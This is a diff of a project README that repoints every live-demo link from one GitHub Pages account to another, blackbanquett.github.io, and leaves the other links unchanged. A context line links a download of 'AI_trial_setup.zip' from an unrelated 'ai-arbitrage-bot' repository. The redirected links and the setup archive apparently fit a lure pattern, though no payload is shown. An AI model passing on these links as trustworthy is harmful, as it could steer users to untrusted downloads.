@@ -7,10 +7,10 @@
 **Give every move a little structure.**
 
 <!-- pages-links:start -->
-[![VIEW DEMO](docs/view-demo.svg)](https://wordystepuncl.github.io/grid/)
+[![VIEW DEMO](docs/view-demo.svg)](https://blackbanquett.github.io/grid/)
 [![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip)
 
-[Live demo](https://wordystepuncl.github.io/grid/) · [Run locally](#run-locally)
+[Live demo](https://blackbanquett.github.io/grid/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
 
 [Open the local HTML demo](#open-the-single-file-demo)
@@ -78,7 +78,7 @@ The build generates `DEMO.html` and the static GitHub Pages app at `dist/client/
 
 ## GitHub Pages
 
-The [live demo](https://wordystepuncl.github.io/grid/) is hosted in the `grid/` folder of the shared [GitHub Pages repository](https://github.com/wordystepuncl/wordystepuncl.github.io). See [GitHub Pages setup](docs/GITHUB_PAGES.md) for the site layout.
+The [live demo](https://blackbanquett.github.io/grid/) is hosted in the `grid/` folder of the shared [GitHub Pages repository](https://github.com/wordystepuncl/wordystepuncl.github.io). See [GitHub Pages setup](docs/GITHUB_PAGES.md) for the site layout.
 
 ## Data and assumptions
 
